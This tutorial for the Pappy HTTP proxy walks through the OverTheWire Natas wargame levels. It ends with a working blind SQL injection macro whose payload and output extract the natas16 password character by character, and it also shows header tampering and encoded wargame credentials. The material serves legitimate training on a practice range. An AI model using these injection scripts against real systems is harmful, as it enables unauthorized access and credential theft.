The Pappy Proxy Tutorial
************************

Table of Contents
=================

.. toctree::

   tutorial

Getting Set Up
==============

Introduction
------------
This is a quick tutorial to get you started using Pappy like a pro. To do this, we'll be going through from `Natas <http://overthewire.org/wargames/natas/>`_. If you haven't done it yet and don't want it spoiled, I suggest giving it a try with Burp since we'll be telling you all the answers right off the bat.

Getting Started
---------------
The first thing you'll need to do is get Pappy installed.

Install from pypi::

    $ pip install pappy

or install from source::

    $ git clone --recursive https://github.com/roglew/pappy-proxy.git
    $ cd pappy-proxy
    $ pip install .

.. note::
   
   Pappy only supports OS X and Linux! Nothing will work on Windows, sorry!


That was easy! Make a project directory anywhere for Natas and fire up Pappy.::

    $ mkdir natas
    $ cd natas
    Copying default config to ./config.json
    Proxy is listening on port 8000
    itsPappyTime>

If you look at what's in the file, you'll notice that there's a ``data.db`` file and a ``config.json`` file.

* ``data.db`` is a SQLite file that stores all the (in-scope) requests that pass through the proxy
* ``config.json`` stores settings for the proxy

You don't need to touch either of these right now. Just hop back into Pappy.

Installing Pappy's CA Cert
--------------------------
In order to intercept HTTPS requests, you'll need to add a CA cert to your browser. Installing the cert allows Pappy to act like a certificate authority and sign certificates for whatever it wants without your browser complaining.

To generate certificates, you'll use the ``gencerts`` command. This will generate certificates in Pappy's directory. By default, all projects will use the certs in this directory, so you should only have to generate/install the certificates once.::

    itsPappyTime> gencerts
    This will overwrite any existing certs in /home/anonymouse/pappy/pappyproxy/certs. Are you sure?
    (y/N) y
    Generating certs to /home/anonymouse/pappy/pappyproxy/certs
    Generating private key...  Done!
    Generating client cert...  Done!
    itsPappyTime>

The directory that the certs get put in may be different for you. Next, you'll need to add the generated ``certificate.crt`` file to your browser. This is different for each browser.

Installing the Cert in Firefox
++++++++++++++++++++++++++++++
1. Open Firefox
2. Go to ``Preferences -> Advanced -> View Certificates -> Authorities``
3. Click ``Import``
4. Navigate to the directory where the certs were generated and double click ``certificate.crt``

Installing the Cert in Chrome
+++++++++++++++++++++++++++++
1. Open Chrome
2. Go to ``Preferences -> Show advanced settings -> HTTPS/SSL -> Manage Certificates -> Authorities``
3. Click ``Import``
4. Navigate to the directory where the certs were generated and double click ``certificate.crt``

Installing the Cert in Safari
+++++++++++++++++++++++++++++
1. Use Finder to navigate to the directory where the certs were generated
2. Double click the cert and follow the prompts to add it to your system keychain

Installing the Cert in Internet Explorer
++++++++++++++++++++++++++++++++++++++++
1. No.

Configuring Your Browser
------------------------
Next, you need to configure your browser to use the proxy. This is generally done using a browser extension. This tutorial won't cover how to configure these plugins. Pappy runs on localhost on port 8000. This can be changed in ``config.json``, but don't worry about that right now.

.. note::
   Configure your browser extension to use the proxy server at **loalhost** on **port 8000**

Here are some proxy plugins that should work

* Firefox: `FoxyProxy <https://addons.mozilla.org/en-us/firefox/addon/foxyproxy-standard/>`_
* Chrome: `Proxy SwitchySharp <https://chrome.google.com/webstore/detail/proxy-switchysharp/dpplabbmogkhghncfbfdeeokoefdjegm?hl=en>`_

Testing it Out
--------------
Start up Pappy in Lite mode by running ``pappy -l``, enable the proxy in your browser, then navigate to a website::

    /pappynatas/ $ pappy -l
    Temporary datafile is /tmp/tmp5AQBrH
    Proxy is listening on port 8000
    itsPappyTime> ls
    ID  Verb  Host         Path               S-Code                 Req Len  Rsp Len  Time  Mngl
    8   GET   vitaly.sexy  /favicon.ico       404 Not Found          0        114      0.21  --
    7   GET   vitaly.sexy  /favicon.ico       404 Not Found          0        114      0.22  --
    6   GET   vitaly.sexy  /esr1.jpg          200 OK                 0        17653    0.29  --
    5   GET   vitaly.sexy  /netscape.gif      200 OK                 0        1135     0.22  --
    4   GET   vitaly.sexy  /construction.gif  200 OK                 0        28366    0.26  --
    3   GET   vitaly.sexy  /vitaly2.jpg       200 OK                 0        2034003  1.34  --
    2   GET   vitaly.sexy  /                  200 OK                 0        1201     0.21  --
    1   GET   vitaly.sexy  /                  301 Moved Permanently  0        178      0.27  --
    itsPappyTime> quit
    Deleting temporary datafile

Make sure that the request you made appears on the list. When you quit, the temporary data file will be deleted, so no cleanup will be required!

The Tutorial
============

Setting the Scope
-----------------
The first thing we'll do is set up Pappy so that it only intercepts requests going to ``*.natas.labs.overthewire.org``::

    itsPappyTime> filter host containsr "natas\.labs\.overthewire\.org$"
    itsPappyTime> scope_save

What these commands do:

1. Make the current context only include requests whose host ends in ``natas.labs.overthewire.org``.
2. Save the current context as the scope

The context is basically requests that pass a list of rules. In this case, we have one rule that says that in order for a request to be in the current context, it must pass the regexp ``natas\.labs\.overthewire\.org$``. When we save the scope, we're saying that any request that doesn't pass this regexp is out of scope and shouldn't be touched.

If this doesn't make sense, don't worry, we'll come back to this.

Natas 0
-------
First, go to `<http://natas0.natas.labs.overthewire.org>`_ and log in with the default creds of ``natas0`` / ``natas0``. You should see a site that says "You can find the password for the next level on this page". You don't need Pappy for this one.

1. Right click the page and select "view source"
2. Read the password for natas1
3. Visit `<http://natas1.natas.labs.overthewire.org>`_ and log in with the username ``natas1`` and the password you found.

Natas 1
-------
Haha! This is the same as natas0, but they got tricky and shut off right-clicking. There's still ways to view the source in the browser, but we'll use Pappy here. The two commands we'll learn here are ``ls``, ``vfq``, and ``vfs``.

* ``ls`` lists the most current requests that are in the current context. You'll be using this a lot to get the IDs of requests you want to do things with.
* ``vfq <reqid>`` prints the full request of a request you specify
* ``vfs <reqid>`` prints the full response to a request you specify

So to solve natas1, we'll want to view the full response to our request to the page::

    itsPappyTime> ls
    ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
    16  GET   natas1.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
    15  GET   natas1.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
    14  GET   natas1.natas.labs.overthewire.org  /                    200 OK            0        1063     0.27  --
    13  GET   natas1.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.27  --
    12  GET   natas0.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
    11  GET   natas0.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.26  --
    10  GET   natas.labs.overthewire.org         /img/wechall.gif     200 OK            0        9279     0.28  --
    9   GET   natas.labs.overthewire.org         /js/wechall.js       200 OK            0        1074     0.50  --
    8   GET   natas.labs.overthewire.org         /js/wechall-data.js  200 OK            0        564      0.48  --
    7   GET   natas.labs.overthewire.org         /js/jquery-ui.js     200 OK            0        435844   1.37  --
    6   GET   natas.labs.overthewire.org         /js/jquery-1.9.1.js  200 OK            0        268381   1.20  --
    4   GET   natas.labs.overthewire.org         /css/wechall.css     200 OK            0        677      0.48  --
    5   GET   natas.labs.overthewire.org         /css/jquery-ui.css   200 OK            0        32046    0.49  --
    3   GET   natas.labs.overthewire.org         /css/level.css       200 OK            0        1332     0.48  --
    2   GET   natas0.natas.labs.overthewire.org  /                    200 OK            0        918      0.26  --
    1   GET   natas0.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.26  --
    itsPappyTime> vfs 14
    
    HTTP/1.1 200 OK
    Date: Fri, 18 Dec 2015 19:47:21 GMT
    Server: Apache/2.4.7 (Ubuntu)
    Last-Modified: Fri, 14 Nov 2014 10:32:33 GMT
    ETag: "427-507cf258a5240-gzip"
    Accept-Ranges: bytes
    Vary: Accept-Encoding
    Content-Length: 1063
    Keep-Alive: timeout=5, max=100
    Connection: Keep-Alive
    Content-Type: text/html
    
    ... snip ...
    
    <!--The password for natas2 is [password] -->

    ... snip ...

    itsPappyTime>

Yay!

Natas 2
-------
When you visit this page, you get a message saying "There is nothing on this page". That is probably a blatant lie. Let's see what was in that response.::

  itsPappyTime> ls
  ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
  30  GET   natas2.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
  29  GET   natas2.natas.labs.overthewire.org  /favicon.ico         404 Not Found     0        307      0.27  --
  28  GET   natas2.natas.labs.overthewire.org  /files/pixel.png     200 OK            0        303      0.27  --
  27  GET   natas2.natas.labs.overthewire.org  /                    200 OK            0        872      0.27  --
  26  GET   natas2.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.27  --
  ... snip ...
  itsPappyTime> vfs 27
  
  HTTP/1.1 200 OK
  ... snip ...
  <body>
  <h1>natas2</h1>
  <div id="content">
  There is nothing on this page
  <img src="files/pixel.png">
  </div>
  </body></html>
  
  itsPappyTime>

So the only suspicious thing is ``<img src="files/pixel.png">``. I'll let you figure out the rest ;)

Natas 3
-------
This one doesn't require Pappy. Just view the ``robots.txt`` file.

Finding Your Passwords Later (How to Use Filters)
-------------------------------------------------
This section will explain how to use Pappy's filters to find passwords to levels you've already completed. Every in-scope request and response that goes through Pappy is stored in the ``data.db`` file in your project directory. We can use filter commands to search through these requests to find resposes with passwords.

Filters
+++++++

Here are the commands we'll learn:

1. ``filter <filter string>`` / ``f <filter string>`` Add a filter that limits which requests are included in the current context
2. ``fu`` Remove the most recently applied filter
3. ``sr`` Reset the context so that it matches the scope
4. ``filter_clear`` Remove all filters from the context, including the filters applied by the scope
5. ``fls`` Show all currently applied filters

The most complicated of these is the ``filter`` command since it takes a filter string as an argument. All a filter string is is a string that defines which requests will pass the filter. Anything that doesn't pass the filter will be removed from the context. Most filter strings are of the format ``<field> <comparer> <value>``. For example::
  
    host is www.target.org

    field = "host"
    comparer = "is"
    value = "www.target.org"

This filter will only match requests whose host is exactly ``www.target.org``. When defining our scope, we applied a filter using a ``containsr`` comparer. This matches any request where the field matches a regular expression. Here are a few fields and comparers:

Commonly used fields

* ``all`` The full text of the request and the response
* ``host`` The hostname of where the request is sent
* ``path`` The target path of the request. ie ``/path/to/page.php``
* ``verb`` The HTTP verb. ie ``POST`` or ``GET`` (case sensitive!)
* ``body`` The data section (the body) of either the request or the response

Commonly used comparers

* ``is <value>`` The field exactly matches the value
* ``contains <value>`` / ``ct <value>`` The field contains a value
* ``containsr <regexp>`` / ``ctr <regexp>`` The field matches a regexp. You may want to surround the regexp in quotes since a number of regexp characters are also control characters in the command line

You can find the rest of the fields and comparers (including some more complex ones) in the actual documentation.

Once you've applied some filters, ``ls`` will only show items that pass all the applied filters. If you want to return to viewing all in-scope items, use ``sr``. If you want to remove the last applied filter, use ``fu``.

Finding Passwords
+++++++++++++++++
While we can't find all the passwords with one filter, if we remember how we got the password, we can find it pretty quickly

For natas0 and natas1, the responses had a phrase like "the password is abc123". So we can filter out anything that doesn't have the word "password" in it.::

    itsPappyTime> ls
    ID  Verb  Host                               Path               S-Code                 Req Len  Rsp Len  Time  Mngl
    52  GET   natas4.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.26  --
    51  GET   natas4.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
    50  GET   natas4.natas.labs.overthewire.org  /                  200 OK                 0        1019     0.27  --
    49  GET   natas4.natas.labs.overthewire.org  /                  401 Unauthorized       0        479      0.26  --
    48  GET   natas3.natas.labs.overthewire.org  /s3cr3t/users.txt  200 OK                 0        40       0.27  --
    46  GET   natas3.natas.labs.overthewire.org  /icons/text.gif    200 OK                 0        229      0.53  --
    47  GET   natas3.natas.labs.overthewire.org  /icons/back.gif    200 OK                 0        216      0.53  --
    45  GET   natas3.natas.labs.overthewire.org  /icons/blank.gif   200 OK                 0        148      0.53  --
    44  GET   natas3.natas.labs.overthewire.org  /s3cr3t/           200 OK                 0        957      0.26  --
    43  GET   natas3.natas.labs.overthewire.org  /s3cr3t            301 Moved Permanently  0        354      0.27  --
    42  GET   natas3.natas.labs.overthewire.org  /robots.txt        200 OK                 0        33       0.29  --
    41  GET   natas3.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.26  --
    40  GET   natas3.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.28  --
    39  GET   natas3.natas.labs.overthewire.org  /                  200 OK                 0        923      0.26  --
    38  GET   natas3.natas.labs.overthewire.org  /                  401 Unauthorized       0        479      0.28  --
    37  GET   natas2.natas.labs.overthewire.org  /files/users.txt   200 OK                 0        145      0.28  --
    36  GET   natas2.natas.labs.overthewire.org  /icons/text.gif    200 OK                 0        229      0.47  --
    35  GET   natas2.natas.labs.overthewire.org  /icons/image2.gif  200 OK                 0        309      0.47  --
    34  GET   natas2.natas.labs.overthewire.org  /icons/back.gif    200 OK                 0        216      0.47  --
    33  GET   natas2.natas.labs.overthewire.org  /icons/blank.gif   200 OK                 0        148      0.47  --
    32  GET   natas2.natas.labs.overthewire.org  /files/            200 OK                 0        1153     0.26  --
    31  GET   natas2.natas.labs.overthewire.org  /files             301 Moved Permanently  0        353      0.27  --
    30  GET   natas2.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
    29  GET   natas2.natas.labs.overthewire.org  /favicon.ico       404 Not Found          0        307      0.27  --
    28  GET   natas2.natas.labs.overthewire.org  /files/pixel.png   200 OK                 0        303      0.27  --
    itsPappyTime> f body ct password
    itsPappyTime> ls
    ID  Verb  Host                               Path                 S-Code            Req Len  Rsp Len  Time  Mngl
    49  GET   natas4.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.26  --
    38  GET   natas3.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.28  --
    37  GET   natas2.natas.labs.overthewire.org  /files/users.txt     200 OK            0        145      0.28  --
    26  GET   natas2.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.27  --
    20  GET   natas.labs.overthewire.org         /js/wechall.js       200 OK            0        1074     0.47  --
    24  GET   natas.labs.overthewire.org         /js/jquery-1.9.1.js  200 OK            0        268381   1.20  --
    17  GET   natas1.natas.labs.overthewire.org  /                    200 OK            0        1063     0.30  --
    14  GET   natas1.natas.labs.overthewire.org  /                    200 OK            0        1063     0.27  --
    13  GET   natas1.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.27  --
    9   GET   natas.labs.overthewire.org         /js/wechall.js       200 OK            0        1074     0.50  --
    6   GET   natas.labs.overthewire.org         /js/jquery-1.9.1.js  200 OK            0        268381   1.20  --
    2   GET   natas0.natas.labs.overthewire.org  /                    200 OK            0        918      0.26  --
    1   GET   natas0.natas.labs.overthewire.org  /                    401 Unauthorized  0        479      0.26  --
    itsPappyTime>

It looks like requests 2 and 14 are the ones we're looking for (we know the password is on the page and those are the requests to / that have a 200 OK response). Use ``vfs`` to look at the response and you'll get the passwords again! It looks like we also found the password from natas2 (the request to /s3cr3t/users.txt).

Anyways, back to Natas!

Natas 4
-------
When we visit this page, we get an error saying that they will only display the password if we visit from ``http://natas5.natas.labs.overthewire.org/``. How does a website track where you came from? The Referer header! Where's that defined? In a header! Do we control the headers? Yes! So all we have to do is set the Referer header to be the correct URL and we're golden.

To do this, we'll be using Pappy's interceptor. The interceptor lets you stop a request from the browser, edit it, then send it to the server. These are the commands we're going to learn:

* ``ic <req|rsp>+`` Begin interception mode. Intercepts requests and/or responses as decided by the arguments given in the command. ``ic req`` will only intercept requests, ``ic rsp`` will only intercept responses, and ``ic req rsp`` will intercept both.

In this case, we only want to intercept requests, so we'll run ``ic req``::

  itsPappyTime> ic req

And we'll get a screen that says something like::

  Currently intercepting: Requests
  0 item(s) in queue.
  Press 'n' to edit the next item or 'q' to quit interceptor.

Now refresh the page in your browser. The page will hang like it's taking a long time to load. Go back to Pappy, and now the interceptor will say something like::

  Currently intercepting: Requests
  1 item(s) in queue.
  Press 'n' to edit the next item or 'q' to quit interceptor.

Press ``n`` and the request will be opened for editing! Which editor is used is defined by the ``EDITOR`` environment variable. Use the text editor to add a ``Referer`` header (note that there's only one r)::

  GET / HTTP/1.1
  Host: natas4.natas.labs.overthewire.org
  User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0
  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
  Accept-Language: en-US,en;q=0.5
  Accept-Encoding: gzip, deflate
  Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664
  Authorization: Basic bmF0YXM0Olo5dGtSa1dtcHQ5UXI3WHJSNWpXUmtnT1U5MDFzd0Va
  Connection: keep-alive
  Cache-Control: max-age=0
  Referer: http://natas5.natas.labs.overthewire.org/

Save and quit, then press ``q`` to quit the interceptor. Go back to the browser and you should have the password for natas5! Yay!

Now if you run ls, you'll notice that the request we made has a ``q`` in the ``Mngl`` column. This means that we mangled the request. If there's an ``s`` in that column, it means we mangled the response. If we ever want to refer to the unmangled version of the request, just prefix the id with a u. For example, you can get the unmangled version of request ``12`` by using the id ``u12``.

Natas 5
-------

This one starts with a screen saying you're not logged in. This is fine. For this one, you'll need to use the interceptor to edit the value of a cookie. I'll let you figure that one out.

Natas 6
-------

This one you should be able to get

Natas 7
-------

You should get this one. Note the hint on the `overthewire website <http://overthewire.org/wargames/natas/>`_: All passwords are also stored in /etc/natas_webpass/. E.g. the password for natas5 is stored in the file /etc/natas_webpass/natas5 and only readable by natas4 and natas5.

Natas 8
-------

You should be able to get this one. If it sucks, google it.

Natas 9
-------

For this one, when you view the source you'll notice they're taking value you entered and inserting it directly into a command line command to grep a file. What we want to do is insert our own arguments to the command. For this one, we will learn how to use the repeater. Here is the command we will learn:

* ``rp <reqid>`` Open the vim repeater with the given request
* ``<leader>f`` (In the repeater) forward the request
  
.. note::
   Use ``:wq!`` to quit the repeater without having to save buffers
  
.. note::
   You must know the basics of how to use vim for the repeater and have a key bound to the leader. You can find more information on the leader key ``here <https://stackoverflow.com/questions/1764263/what-is-the-leader-in-a-vimrc-file>``. By default <leader> is bound to ``\``.
   
Submit a request then open that request in the repeater.::
  itsPappyTime> ls
  196  GET   natas9.natas.labs.overthewire.org  /index.php?needle=ball&submit=Search      200 OK            0        1686     0.27  --
  195  GET   natas9.natas.labs.overthewire.org  /index-source.html                        200 OK            0        1952     0.27  --
  ... snip ...
  itsPappyTime> rp 196

Vim will open up in a vertical split with the request on the left and the response on the right.

In the repeater, you edit the response on the left, then press the ``<leader>`` key then ``f`` to submit the modified request (note that your cursor must be in the left window). The response will then be put in the right window. This makes it easy to quickly make requests which are all slight variations of each other.

In this case, we'll be editing the ``needle`` get parameter. Try changing "ball" to "bill" and submitting it. You'll notice that the output in the right window changes to contain words that have the word "bill" in them. The repeater will make it easy to make tweaks to your payload and get quick feedback without having to use the browser.

Use the repeater to solve this challenge (you may need to url encode some characters by hand, unfortunately).

Skip a few... Natas 15
----------------------
All the challenges up to this point should be doable with the repeater/interceptor. Natas15 is where things get hairy though. This is a blind SQL injection, and you'll have to write a script to do it. Luckily for us, writing scripts using Pappy is easy. If you're lazy and don't want to actually do the challenges, google the password for natas15 then come back.

Commands we'll learn:

* ``gma <name> <reqid(s)>`` Generate a macro with objects pre-defined for the given requests
* ``lma`` Load macros
* ``rma <name> [args]`` Run a macro, optionally with arguments

So the first thing we'll do is submit a request to have a base request that we can modify. Submit a request with any username. You should get a response back saying the user doesn't exist. Now we'll generate a macro and use that request as a base for our script::

  itsPappyTime> ls
  ID   Verb  Host                                Path                                      S-Code            Req Len  Rsp Len  Time  Mngl
  224  POST  natas15.natas.labs.overthewire.org  /index.php                                200 OK            14       937      0.27  --
  223  POST  natas15.natas.labs.overthewire.org  /index.php                                200 OK            12       937      0.27  --
  222  GET   natas15.natas.labs.overthewire.org  /index-source.html                        200 OK            0        3325     0.28  --
  221  GET   natas15.natas.labs.overthewire.org  /favicon.ico                              404 Not Found     0        308      0.25  --
  220  GET   natas15.natas.labs.overthewire.org  /favicon.ico                              404 Not Found     0        308      0.27  --
  219  GET   natas15.natas.labs.overthewire.org  /                                         200 OK            0        1049     0.37  --
  218  GET   natas15.natas.labs.overthewire.org  /                                         401 Unauthorized  0        480      0.27  --
  ... snip ...

  itsPappyTime> gma brute 224
  Wrote script to macro_brute.py
  itsPappyTime>

Now open up ``macro_brute.py`` in your favorite text editor. You should have a script that looks like this::

  from pappyproxy.http import Request, get_request, post_request
  from pappyproxy.context import set_tag
  
  MACRO_NAME = 'Macro 41855887'
  SHORT_NAME = ''
  
  ###########
  ## Requests
  # It's suggested that you call .copy() on these and then edit attributes
  # as needed to create modified requests
  ##
  
  
  req1 = Request((
      'POST /index.php HTTP/1.1\r\n'
      'Host: natas15.natas.labs.overthewire.org\r\n'
      'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0\r\n'
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
      'Accept-Language: en-US,en;q=0.5\r\n'
      'Accept-Encoding: gzip, deflate\r\n'
      'Referer: http://natas15.natas.labs.overthewire.org/\r\n'
      'Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664\r\n'
      'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==\r\n'
      'Connection: keep-alive\r\n'
      'Content-Type: application/x-www-form-urlencoded\r\n'
      'Content-Length: 14\r\n'
      '\r\n'
      'username=admin'
  ))
  
  
  def run_macro(args):
      # Example:
      # req = req0.copy() # Copy req0
      # req.submit() # Submit the request to get a response
      # print req.response.raw_headers # print the response headers
      # req.save() # save the request to the data file
      # or copy req0 into a loop and use string substitution to automate requests
      pass

Pappy will generate a script and create a ``Request`` object that you can use. Check out the real documentation to see everything you can do with a ``Request`` object. For now you just need to know a few things about it:

* :func:`~pappyproxy.http.Request.submit` Submit the request and store the response object
* :func:`~pappyproxy.http.Request.save` Save the request/response to the data file
* ``post_params`` A :class:`~pappyproxy.http.RepeatableDict` that represents the post parameters of the request. Can set/get prameters the same way as a dictionary.
  
It is suggested you go through the documentation to learn the rest of the attributes/functions.

To start out simple, we'll write a macro that lets us check a username from the Pappy console. To define a function, you define the ``run_macro`` function. The function is passed a list of arguments which represent the arguments entered. Here a ``run_macro`` function that we can define that will check if a user exists::

    def run_macro(args):
        to_check = args[0] # get the username to check
        r = req1.copy() # make a copy of the base request
        r.post_params['username'] = to_check # set the username param of the request
        r.submit() # submit the request
        if "This user doesn't exist." in r.response.raw_data: # check if the username is valid
            print "%s is not a user" % to_check
        else:
            print "%s is a user!" % to_check

Then to run it::

  itsPappyTime> lma
  Loaded "<Macro Macro 41855887 (brute)>"
  itsPappyTime> rma brute admin
  admin is not a user
  itsPappyTime> rma brute fooooo
  fooooo is not a user
  itsPappyTime> rma brute natas16
  natas16 is a user!
  itsPappyTime>

Awesome! Notice how we didn't have to deal with authentication either. This is because the authentication is handled by the ``Authorization`` header which was included in the generated request.

Time to add the SQL injection part. If we look at the source, we see that this is the SQL query that checks the username::
  
  $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\""; 

So to escape it, we use a payload like::

  username" OR 1=1; #

In this case, any username that ends in ``" OR 1=1; #`` will be considered a valid username. Let's try this out::

  itsPappyTime> rma brute "foo\" OR 1=1;"
  foo" OR 1=1; is a user!
  itsPappyTime> rma brute "fooooooo\" OR 1=1;"
  fooooooo" OR 1=1; is a user!
  itsPappyTime>

Great! Now we can check any true/false condition we want. In this case, we want to check if a certain character is at a certain position in the ``password`` column. We do this with the ``ASCII`` and ``SUBSTRING`` functions. So something like this will check if the first character is an ``A``.::

  'natas16" AND ASCII(SUBSTRING(password, 0, 1)) = 41; #'

Alright, let's update our macro to find the first character of the password.::

  from pappyproxy.http import Request, get_request, post_request
  from pappyproxy.context import set_tag
  
  MACRO_NAME = 'Macro 41855887'
  SHORT_NAME = ''
  
  ###########
  ## Requests
  # It's suggested that you call .copy() on these and then edit attributes
  # as needed to create modified requests
  ##
  
  
  req1 = Request((
      'POST /index.php HTTP/1.1\r\n'
      'Host: natas15.natas.labs.overthewire.org\r\n'
      'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0\r\n'
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
      'Accept-Language: en-US,en;q=0.5\r\n'
      'Accept-Encoding: gzip, deflate\r\n'
      'Referer: http://natas15.natas.labs.overthewire.org/\r\n'
      'Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664\r\n'
      'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==\r\n'
      'Connection: keep-alive\r\n'
      'Content-Type: application/x-www-form-urlencoded\r\n'
      'Content-Length: 14\r\n'
      '\r\n'
      'username=admin'
  ))
  
  def check_char(char, pos):
      payload = 'natas16" AND ASCII(SUBSTRING(password, %d, 1)) = %d; #' % (pos, ord(char))
      r = req1.copy()
      r.post_params['username'] = payload
      r.submit()
      if "This user doesn't exist." in r.response.raw_data:
          return False
      else:
          return True
  
  def run_macro(args):
      valid_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890"
      for c in valid_chars:
          print 'Trying %s...' % c
          if check_char(c, 1):
              print '%s is the first char!' % c
              return
      print "The script didn't work"

And when we run it...::

  itsPappyTime> lma
  Loaded "<Macro Macro 41855887 (brute)>"
  itsPappyTime> rma brute
  Trying a...
  Trying b...
  Trying c...
  Trying d...
  ... snip ...
  Trying U...
  Trying V...
  Trying W...
  W is the first char!
  itsPappyTime>

We find the first character! Woo! Next we just have to do this for each position. Even through we don't know the length of the password, we will know that the password is over when none of the characters are valid. So let's update our macro::

  import sys
  from pappyproxy.http import Request, get_request, post_request
  from pappyproxy.context import set_tag
  
  MACRO_NAME = 'Macro 41855887'
  SHORT_NAME = ''
  
  ###########
  ## Requests
  # It's suggested that you call .copy() on these and then edit attributes
  # as needed to create modified requests
  ##
  
  
  req1 = Request((
      'POST /index.php HTTP/1.1\r\n'
      'Host: natas15.natas.labs.overthewire.org\r\n'
      'User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0\r\n'
      'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n'
      'Accept-Language: en-US,en;q=0.5\r\n'
      'Accept-Encoding: gzip, deflate\r\n'
      'Referer: http://natas15.natas.labs.overthewire.org/\r\n'
      'Cookie: __cfduid=db41e9d9b4a13cc3ef4273055b71996fb1450464664\r\n'
      'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==\r\n'
      'Connection: keep-alive\r\n'
      'Content-Type: application/x-www-form-urlencoded\r\n'
      'Content-Length: 14\r\n'
      '\r\n'
      'username=admin'
  ))
  
  def check_char(char, pos):
      payload = 'natas16" AND ASCII(SUBSTRING(password, %d, 1)) = %d; #' % (pos, ord(char))
      r = req1.copy()
      r.post_params['username'] = payload
      r.submit()
      if "This user doesn't exist." in r.response.raw_data:
          return False
      else:
          return True
  
  def run_macro(args):
      valid_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890"
      password = ''
      done = False
      while True:
          done = True
          for c in valid_chars:
              # Print the current char to the current line
              print c,
              sys.stdout.flush()
  
              # Check the current char
              if check_char(c, len(password)+1):
                  # We got the correct char!
                  password += c
                  # Print it to the screen
                  print ''
                  print '%s is char %d!' % (c, len(password)+1)
                  print 'The password so far is %s' % password
                  # We have to do another round
                  done = False
                  break
          if done:
              # We got through the entire alphabet
              print ''
              print 'Done! The password is "%s"' % password
              break

Then we run it::

  itsPappyTime> lma
  Loaded "<Macro Macro 41855887 (brute)>"
  itsPappyTime> rma brute
  a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W
  W is char 1!
  The password so far is W
  a
  a is char 2!
  The password so far is Wa
  a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I
  I is char 3!
  The password so far is WaI
  a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H
  H is char 4!
  The password so far is WaIH
  a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E

  ... snip ...

  The password so far is WaIHEacj63wnNIBROHeqi3p9t0m5nh
  a b c d e f g h i j k l m
  m is char 31!
  The password so far is WaIHEacj63wnNIBROHeqi3p9t0m5nhm
  a b c d e f g h
  h is char 32!
  The password so far is WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
  a b c d e f g h i j k l m n o p q r s t u v w x y z A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 0 1 2 3 4 5 6 7 8 9 0
  Done! The password is "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"
  itsPappyTime>

Boom! There it is!

Conclusion
==========

That's pretty much all you need to get started with Pappy. Make sure to go through the documentation to learn about all the other features that weren't covered in this tutorial. Hopefully you didn't find Pappy too hard to use and you'll consider it for your next engagement.
